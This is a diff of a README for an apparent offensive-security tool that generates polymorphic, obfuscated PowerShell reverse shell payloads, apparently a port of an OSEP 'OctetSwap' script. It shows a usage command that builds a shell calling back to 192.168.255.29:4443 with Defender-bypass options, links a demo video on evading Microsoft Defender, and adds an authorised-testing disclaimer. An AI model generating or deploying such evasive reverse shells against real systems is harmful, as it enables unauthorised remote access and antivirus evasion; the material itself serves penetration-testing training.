@@ -1,5 +1,8 @@
 # PS1 Generator  
 
+>Polymorphic Obfuscated PowerShell Reverse Shell Payload Generator - Offensice Security Education & Research Purpose only!
+>Only Test on authroized targets and systems with prior approval from owner first.
+
 >PowerShell version of the ***OctetSwap*** Bash shell script.  
 
 >The credit goes to and is the original source inspiration: https://github.com/Y3llowDuck/OSEP/tree/main/OctetSwap for this PowerShell TCP Reverse Shell generator script.  
@@ -9,10 +12,12 @@
 ```powershell
 cd C:\Users\admin\Documents
 
-.\New-Generator-v1.8.ps1 -IP 192.168.255.29 -Port 4443 -Confuse -BypassMode Both -BasicShellFile "C:\Users\admin\Documents\basic_source_shell.ps1" -insertfile "C:\Users\admin\Documents\ChainedMathLogging.ps1"
+.\New-Generator-v1.8.ps1 -IP 192.168.255.29 -Port 4443 -Confuse -BypassMode Both -BasicShellFile ".\basic_source_shell.ps1" -insertfile ".\ChainedMathLoggingConfusion.ps1"
 ```  
 
 ## Bypass Basic Microsoft Defender Virus & Threat Protection Video  
+
+>[Youtube Demo Video](https://youtu.be/xMyllVUZadk)  
 
 <img src="video/poly-obfuscate-confuse-mix1.gif" width="600" alt="Poly Obfuscate Demo">  
 
